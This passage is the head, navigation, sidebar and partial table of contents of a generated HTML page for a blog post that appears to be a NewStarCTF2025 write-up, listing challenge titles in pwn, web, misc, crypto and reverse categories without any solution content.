@@ -1,0 +1,1843 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="robots" content="noindex, nofollow" />
+  <link rel="icon shortcut" href="/favicon.ico" sizes="32x32" />
+<link rel="icon" href="/favicon.svg" type="image/svg+xml" id="favicon-svg" />
+<link rel="icon" href="/favicon-16x16.png" type="image/png" sizes="16x16" />
+<link rel="icon" href="/favicon-32x32.png" type="image/png" sizes="32x32" />
+<link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180" />
+<link fetchpriority="low" href="/site.webmanifest" rel="manifest" />
+<title>NewStarCTF2025 WP – Parad0x7e&#39;s Blog</title>
+  <meta name="description" content="NewStarCTF2025第一周的WP" /><link rel="canonical" href="http://localhost:1313/wp/newstarctf2025-wp/" itemprop="url" />
+
+<meta property="og:title" content="NewStarCTF2025 WP">
+<meta
+  property="og:description"
+  content="
+    
+      NewStarCTF2025第一周的WP
+    
+  ">
+<meta
+  property="og:type"
+  content="
+    article
+  ">
+<meta property="og:url" content="http://localhost:1313/wp/newstarctf2025-wp/"><meta property="article:section" content="wp">
+
+<meta
+  property="article:published_time"
+  content="2026-01-26T22:33:40+08:00">
+
+
+<meta
+  property="article:modified_time"
+  content="2026-01-26T22:33:40+08:00">
+
+
+
+  <meta itemprop="name" content="NewStarCTF2025 WP">
+  <meta itemprop="description" content="NewStarCTF2025第一周的WP">
+  <meta itemprop="datePublished" content="2026-01-26T22:33:40+08:00">
+  <meta itemprop="dateModified" content="2026-01-26T22:33:40+08:00">
+  <meta itemprop="wordCount" content="1996">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="NewStarCTF2025 WP">
+  <meta name="twitter:description" content="NewStarCTF2025第一周的WP">
+<link href="/css/compiled/main.css" rel="stylesheet" />
+    <link href="/css/variables.css" rel="stylesheet" />
+    <link href="/css/custom.css" rel="stylesheet" />
+
+  
+
+
+  <script>
+    
+
+    function setTheme(theme) {
+      document.documentElement.classList.remove("light", "dark");
+
+      if (theme !== "light" && theme !== "dark") {
+       theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+      }
+
+      document.documentElement.classList.add(theme);
+      document.documentElement.style.colorScheme = theme;
+    }
+
+    setTheme("color-theme" in localStorage ? localStorage.getItem("color-theme") : 'system')
+
+  </script>
+
+  <script>
+    
+
+    if (localStorage.getItem('banner-closed')) {
+      document.documentElement.style.setProperty("--hextra-banner-height", "0px");
+      document.documentElement.classList.add("hextra-banner-hidden");
+    }
+  </script>
+
+  
+  
+  </head>
+<body><div class="hextra-nav-container hx:sticky hx:top-0 hx:z-20 hx:w-full hx:bg-transparent hx:print:hidden">
+  <div
+    class="hextra-nav-container-blur hx:pointer-events-none hx:absolute hx:z-[-1] hx:h-full hx:w-full hx:bg-white hx:dark:bg-dark hx:shadow-[0_2px_4px_rgba(0,0,0,.02),0_1px_0_rgba(0,0,0,.06)] hx:contrast-more:shadow-[0_0_0_1px_#000] hx:dark:shadow-[0_-1px_0_rgba(255,255,255,.1)_inset] hx:contrast-more:dark:shadow-[0_0_0_1px_#fff]"
+  ></div>
+
+  <nav class="hextra-max-navbar-width hx:mx-auto hx:flex hx:items-center hx:justify-end hx:gap-2 hx:h-16 hx:px-6">
+    <a class="hx:flex hx:items-center hx:hover:opacity-75 hx:ltr:mr-auto hx:rtl:ml-auto" href="/">
+    <img class="hx:mr-2 hx:block hx:dark:hidden" src="/images/logo.svg" alt="Logo" height="20" width="20" />
+    <img class="hx:mr-2 hx:hidden hx:dark:block" src="/images/logo.svg" alt="Dark Logo" height="20" width="20" />
+    <span class="hx:mr-2 hx:font-extrabold hx:inline hx:select-none" title="Parad0x7e&#39;s Blog">Parad0x7e&#39;s Blog</span>
+</a>
+<a
+  title=""
+  href="/arch"
+  
+  class="hx:text-sm hx:contrast-more:text-gray-700 hx:contrast-more:dark:text-gray-100 hx:relative hx:-ml-2 hx:hidden hx:whitespace-nowrap hx:p-2 hx:md:inline-flex hx:items-center hx:gap-1 hx:text-gray-600 hx:hover:text-gray-800 hx:dark:text-gray-400 hx:dark:hover:text-gray-200"
+><span class="hx:text-center">Arch</span>
+</a><a
+  title=""
+  href="/vul"
+  
+  class="hx:text-sm hx:contrast-more:text-gray-700 hx:contrast-more:dark:text-gray-100 hx:relative hx:-ml-2 hx:hidden hx:whitespace-nowrap hx:p-2 hx:md:inline-flex hx:items-center hx:gap-1 hx:text-gray-600 hx:hover:text-gray-800 hx:dark:text-gray-400 hx:dark:hover:text-gray-200"
+><span class="hx:text-center">Vuln Repro</span>
+</a><a
+  title=""
+  href="/wp"
+  
+  class="hx:text-sm hx:contrast-more:text-gray-700 hx:contrast-more:dark:text-gray-100 hx:relative hx:-ml-2 hx:hidden hx:whitespace-nowrap hx:p-2 hx:md:inline-flex hx:items-center hx:gap-1 hx:font-medium"
+><span class="hx:text-center">Write Up</span>
+</a><div class="hextra-search-wrapper hx:relative hx:md:w-64">
+  <div class="hx:relative hx:flex hx:items-center hx:text-gray-900 hx:contrast-more:text-gray-800 hx:dark:text-gray-300 hx:contrast-more:dark:text-gray-300">
+    <input
+      placeholder="搜索文档..."
+      class="hextra-search-input hx:focus:hextra-focus hx:block hx:w-full hx:appearance-none hx:rounded-lg hx:px-3 hx:py-2 hx:transition-colors hx:text-base hx:leading-tight hx:md:text-sm hx:bg-black/[.05] hx:dark:bg-gray-50/10 hx:focus:bg-white hx:dark:focus:bg-dark hx:placeholder:text-gray-500 hx:dark:placeholder:text-gray-400 hx:contrast-more:border hx:contrast-more:border-current"
+      type="search"
+      value=""
+      spellcheck="false"
+    />
+    <kbd
+      class="hx:absolute hx:my-1.5 hx:select-none hx:ltr:right-1.5 hx:rtl:left-1.5 hx:h-5 hx:rounded-sm hx:bg-white hx:px-1.5 hx:font-mono hx:text-[10px] hx:font-medium hx:text-gray-500 hx:border hx:border-gray-200 hx:dark:border-gray-100/20 hx:dark:bg-dark/50 hx:contrast-more:border-current hx:contrast-more:text-current hx:contrast-more:dark:border-current hx:items-center hx:gap-1 hx:transition-opacity hx:pointer-events-none hx:hidden hx:sm:flex"
+    >
+      CTRL K
+    </kbd>
+  </div>
+
+  <div>
+    <ul
+      class="hextra-search-results hextra-scrollbar hx:hidden hx:border hx:border-gray-200 hx:bg-white hx:text-gray-100 hx:dark:border-neutral-800 hx:dark:bg-neutral-900 hx:absolute hx:top-full hx:z-20 hx:mt-2 hx:overflow-auto hx:overscroll-contain hx:rounded-xl hx:py-2.5 hx:shadow-xl hx:max-h-[min(calc(50vh-11rem-env(safe-area-inset-bottom)),400px)] hx:md:max-h-[min(calc(100vh-5rem-env(safe-area-inset-bottom)),400px)] hx:inset-x-0 hx:ltr:md:left-auto hx:rtl:md:right-auto hx:contrast-more:border hx:contrast-more:border-gray-900 hx:contrast-more:dark:border-gray-50 hx:w-screen hx:min-h-[100px] hx:max-w-[min(calc(100vw-2rem),calc(100%+20rem))]"
+      style="transition: max-height 0.2s ease 0s;"
+    ></ul>
+  </div>
+</div>
+
+          <a class="hx:p-2 hx:text-current" target="_blank" rel="noreferrer" href="https://github.com/Parad0x7e" title="GitHub"><svg height=24 fill="currentColor" viewBox="3 3 18 18">
+  <path d="M12 3C7.0275 3 3 7.12937 3 12.2276C3 16.3109 5.57625 19.7597 9.15374 20.9824C9.60374 21.0631 9.77249 20.7863 9.77249 20.5441C9.77249 20.3249 9.76125 19.5982 9.76125 18.8254C7.5 19.2522 6.915 18.2602 6.735 17.7412C6.63375 17.4759 6.19499 16.6569 5.8125 16.4378C5.4975 16.2647 5.0475 15.838 5.80124 15.8264C6.51 15.8149 7.01625 16.4954 7.18499 16.7723C7.99499 18.1679 9.28875 17.7758 9.80625 17.5335C9.885 16.9337 10.1212 16.53 10.38 16.2993C8.3775 16.0687 6.285 15.2728 6.285 11.7432C6.285 10.7397 6.63375 9.9092 7.20749 9.26326C7.1175 9.03257 6.8025 8.08674 7.2975 6.81794C7.2975 6.81794 8.05125 6.57571 9.77249 7.76377C10.4925 7.55615 11.2575 7.45234 12.0225 7.45234C12.7875 7.45234 13.5525 7.55615 14.2725 7.76377C15.9937 6.56418 16.7475 6.81794 16.7475 6.81794C17.2424 8.08674 16.9275 9.03257 16.8375 9.26326C17.4113 9.9092 17.76 10.7281 17.76 11.7432C17.76 15.2843 15.6563 16.0687 13.6537 16.2993C13.98 16.5877 14.2613 17.1414 14.2613 18.0065C14.2613 19.2407 14.25 20.2326 14.25 20.5441C14.25 20.7863 14.4188 21.0746 14.8688 20.9824C16.6554 20.364 18.2079 19.1866 19.3078 17.6162C20.4077 16.0457 20.9995 14.1611 21 12.2276C21 7.12937 16.9725 3 12 3Z"></path>
+</svg>
+<span class="hx:sr-only">GitHub</span>
+          </a><button type="button" aria-label="Menu" class="hextra-hamburger-menu hx:cursor-pointer hx:-mr-2 hx:rounded-sm hx:p-2 hx:active:bg-gray-400/20 hx:md:hidden"><svg height=24 fill="none" viewBox="0 0 24 24" stroke="currentColor"><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 8H20"></path></g><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16H20"></path></g></svg></button>
+  </nav>
+</div>
+
+  <div class="hx:mx-auto hx:flex hextra-max-page-width">
+    <aside class="hextra-sidebar-container hx:flex hx:flex-col hx:print:hidden hx:md:top-16 hx:md:shrink-0 hx:md:w-64 hx:md:self-start hx:max-md:[transform:translate3d(0,-100%,0)] hx:md:hidden hx:xl:block">
+  
+  <div class="hx:px-4 hx:pt-4 hx:md:hidden">
+    <div class="hextra-search-wrapper hx:relative hx:md:w-64">
+  <div class="hx:relative hx:flex hx:items-center hx:text-gray-900 hx:contrast-more:text-gray-800 hx:dark:text-gray-300 hx:contrast-more:dark:text-gray-300">
+    <input
+      placeholder="搜索文档..."
+      class="hextra-search-input hx:focus:hextra-focus hx:block hx:w-full hx:appearance-none hx:rounded-lg hx:px-3 hx:py-2 hx:transition-colors hx:text-base hx:leading-tight hx:md:text-sm hx:bg-black/[.05] hx:dark:bg-gray-50/10 hx:focus:bg-white hx:dark:focus:bg-dark hx:placeholder:text-gray-500 hx:dark:placeholder:text-gray-400 hx:contrast-more:border hx:contrast-more:border-current"
+      type="search"
+      value=""
+      spellcheck="false"
+    />
+    <kbd
+      class="hx:absolute hx:my-1.5 hx:select-none hx:ltr:right-1.5 hx:rtl:left-1.5 hx:h-5 hx:rounded-sm hx:bg-white hx:px-1.5 hx:font-mono hx:text-[10px] hx:font-medium hx:text-gray-500 hx:border hx:border-gray-200 hx:dark:border-gray-100/20 hx:dark:bg-dark/50 hx:contrast-more:border-current hx:contrast-more:text-current hx:contrast-more:dark:border-current hx:items-center hx:gap-1 hx:transition-opacity hx:pointer-events-none hx:hidden hx:sm:flex"
+    >
+      CTRL K
+    </kbd>
+  </div>
+
+  <div>
+    <ul
+      class="hextra-search-results hextra-scrollbar hx:hidden hx:border hx:border-gray-200 hx:bg-white hx:text-gray-100 hx:dark:border-neutral-800 hx:dark:bg-neutral-900 hx:absolute hx:top-full hx:z-20 hx:mt-2 hx:overflow-auto hx:overscroll-contain hx:rounded-xl hx:py-2.5 hx:shadow-xl hx:max-h-[min(calc(50vh-11rem-env(safe-area-inset-bottom)),400px)] hx:md:max-h-[min(calc(100vh-5rem-env(safe-area-inset-bottom)),400px)] hx:inset-x-0 hx:ltr:md:left-auto hx:rtl:md:right-auto hx:contrast-more:border hx:contrast-more:border-gray-900 hx:contrast-more:dark:border-gray-50 hx:w-screen hx:min-h-[100px] hx:max-w-[min(calc(100vw-2rem),calc(100%+20rem))]"
+      style="transition: max-height 0.2s ease 0s;"
+    ></ul>
+  </div>
+</div>
+
+  </div>
+  <div class="hextra-scrollbar hx:overflow-y-auto hx:overflow-x-hidden hx:p-4 hx:grow hx:md:h-[calc(100vh-var(--navbar-height)-var(--menu-height))]">
+    <ul class="hx:flex hx:flex-col hx:gap-1 hx:md:hidden">
+      
+      
+          <li class="open"><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/wp/"
+    
+  >Wp
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx:h-[18px] hx:min-w-[18px] hx:rounded-xs hx:p-0.5 hx:hover:bg-gray-800/5 hx:dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx:origin-center hx:transition-transform hx:rtl:-rotate-180"></path></svg></span>
+    </a><div class="hx:ltr:pr-0 hx:overflow-hidden">
+        <ul class='hx:relative hx:flex hx:flex-col hx:gap-1 hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:ltr:ml-3 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:mr-3 hx:rtl:pr-3 hx:rtl:before:right-0 hx:dark:before:bg-neutral-800'><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/wp/ilovectf2025-wp/"
+    
+  >?CTF2025 WP
+    </a>
+              
+            </li><li class="hx:flex hx:flex-col open"><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hextra-sidebar-active-item hx:bg-primary-100 hx:font-semibold hx:text-primary-800 hx:contrast-more:border hx:contrast-more:border-primary-500 hx:dark:bg-primary-400/10 hx:dark:text-primary-600 hx:contrast-more:dark:border-primary-500"
+    href="/wp/newstarctf2025-wp/"
+    
+  >NewStarCTF2025 WP
+    </a>
+  
+    <ul class='hx:flex hx:flex-col hx:gap-1 hx:relative hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:dark:before:bg-neutral-800 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:pr-3 hx:rtl:before:right-0 hx:ltr:ml-3 hx:rtl:mr-3'><li>
+              <a
+                href="#pwn"
+                class="hx:flex hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [word-break:break-word] hx:cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:contrast-more:border hx:gap-2 hx:before:opacity-25 hx:before:content-['#'] hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:text-gray-900 hx:contrast-more:dark:text-gray-50 hx:contrast-more:border-transparent hx:contrast-more:hover:border-gray-900 hx:contrast-more:dark:hover:border-gray-50"
+              >Pwn</a>
+            </li>
+          <li>
+              <a
+                href="#web"
+                class="hx:flex hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [word-break:break-word] hx:cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:contrast-more:border hx:gap-2 hx:before:opacity-25 hx:before:content-['#'] hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:text-gray-900 hx:contrast-more:dark:text-gray-50 hx:contrast-more:border-transparent hx:contrast-more:hover:border-gray-900 hx:contrast-more:dark:hover:border-gray-50"
+              >Web</a>
+            </li>
+          <li>
+              <a
+                href="#misc"
+                class="hx:flex hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [word-break:break-word] hx:cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:contrast-more:border hx:gap-2 hx:before:opacity-25 hx:before:content-['#'] hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:text-gray-900 hx:contrast-more:dark:text-gray-50 hx:contrast-more:border-transparent hx:contrast-more:hover:border-gray-900 hx:contrast-more:dark:hover:border-gray-50"
+              >Misc</a>
+            </li>
+          <li>
+              <a
+                href="#crypto"
+                class="hx:flex hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [word-break:break-word] hx:cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:contrast-more:border hx:gap-2 hx:before:opacity-25 hx:before:content-['#'] hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:text-gray-900 hx:contrast-more:dark:text-gray-50 hx:contrast-more:border-transparent hx:contrast-more:hover:border-gray-900 hx:contrast-more:dark:hover:border-gray-50"
+              >Crypto</a>
+            </li>
+          <li>
+              <a
+                href="#reverse"
+                class="hx:flex hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [word-break:break-word] hx:cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:contrast-more:border hx:gap-2 hx:before:opacity-25 hx:before:content-['#'] hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:text-gray-900 hx:contrast-more:dark:text-gray-50 hx:contrast-more:border-transparent hx:contrast-more:hover:border-gray-900 hx:contrast-more:dark:hover:border-gray-50"
+              >Reverse</a>
+            </li>
+          <li>
+              <a
+                href="#%e6%8c%91%e6%88%98"
+                class="hx:flex hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [word-break:break-word] hx:cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:contrast-more:border hx:gap-2 hx:before:opacity-25 hx:before:content-['#'] hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:text-gray-900 hx:contrast-more:dark:text-gray-50 hx:contrast-more:border-transparent hx:contrast-more:hover:border-gray-900 hx:contrast-more:dark:hover:border-gray-50"
+              >挑战</a>
+            </li>
+          <li>
+              <a
+                href="#web-1"
+                class="hx:flex hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [word-break:break-word] hx:cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:contrast-more:border hx:gap-2 hx:before:opacity-25 hx:before:content-['#'] hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:text-gray-900 hx:contrast-more:dark:text-gray-50 hx:contrast-more:border-transparent hx:contrast-more:hover:border-gray-900 hx:contrast-more:dark:hover:border-gray-50"
+              >Web</a>
+            </li>
+          <li>
+              <a
+                href="#misc-1"
+                class="hx:flex hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [word-break:break-word] hx:cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:contrast-more:border hx:gap-2 hx:before:opacity-25 hx:before:content-['#'] hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:text-gray-900 hx:contrast-more:dark:text-gray-50 hx:contrast-more:border-transparent hx:contrast-more:hover:border-gray-900 hx:contrast-more:dark:hover:border-gray-50"
+              >Misc</a>
+            </li>
+          </ul>
+  
+              
+            </li></ul>
+      </div></li>
+          <li class=""><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/vul/"
+    
+  >Vul
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx:h-[18px] hx:min-w-[18px] hx:rounded-xs hx:p-0.5 hx:hover:bg-gray-800/5 hx:dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx:origin-center hx:transition-transform hx:rtl:-rotate-180"></path></svg></span>
+    </a><div class="hx:ltr:pr-0 hx:overflow-hidden">
+        <ul class='hx:relative hx:flex hx:flex-col hx:gap-1 hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:ltr:ml-3 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:mr-3 hx:rtl:pr-3 hx:rtl:before:right-0 hx:dark:before:bg-neutral-800'><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/vul/zabbix%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+    
+  >Zabbix历史漏洞复现
+    </a>
+              
+            </li><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/vul/jenkins%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+    
+  >Jenkins历史漏洞复现
+    </a>
+              
+            </li></ul>
+      </div></li>
+          <li class=""><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/arch/"
+    
+  >Arch
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx:h-[18px] hx:min-w-[18px] hx:rounded-xs hx:p-0.5 hx:hover:bg-gray-800/5 hx:dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx:origin-center hx:transition-transform hx:rtl:-rotate-180"></path></svg></span>
+    </a><div class="hx:ltr:pr-0 hx:overflow-hidden">
+        <ul class='hx:relative hx:flex hx:flex-col hx:gap-1 hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:ltr:ml-3 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:mr-3 hx:rtl:pr-3 hx:rtl:before:right-0 hx:dark:before:bg-neutral-800'><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/arch/%E5%9C%A8ubuntu%E4%B8%AD%E5%BD%BB%E5%BA%95%E5%88%A0%E9%99%A4snap/"
+    
+  >在Ubuntu中彻底删除SNAP
+    </a>
+              
+            </li></ul>
+      </div></li>
+    </ul>
+
+    <div class="hx:max-xl:hidden hx:h-0 hx:w-64 hx:shrink-0"></div></div>
+  
+  </aside>
+    
+<nav class="hextra-toc hx:order-last hx:hidden hx:w-64 hx:shrink-0 hx:xl:block hx:print:hidden hx:px-4" aria-label="table of contents">
+    <div class="hextra-scrollbar hx:sticky hx:top-16 hx:overflow-y-auto hx:pr-4 hx:pt-6 hx:text-sm [hyphens:auto] hx:max-h-[calc(100vh-var(--navbar-height)-env(safe-area-inset-bottom))] hx:ltr:-mr-4 hx:rtl:-ml-4"><p class="hx:mb-4 hx:font-semibold hx:tracking-tight">此页上</p><ul>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#pwn">Pwn
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#gnu-debugger">GNU Debugger
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#intbug">INTbug
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#pwns-door">pwn’s door
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#overflow">overflow
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
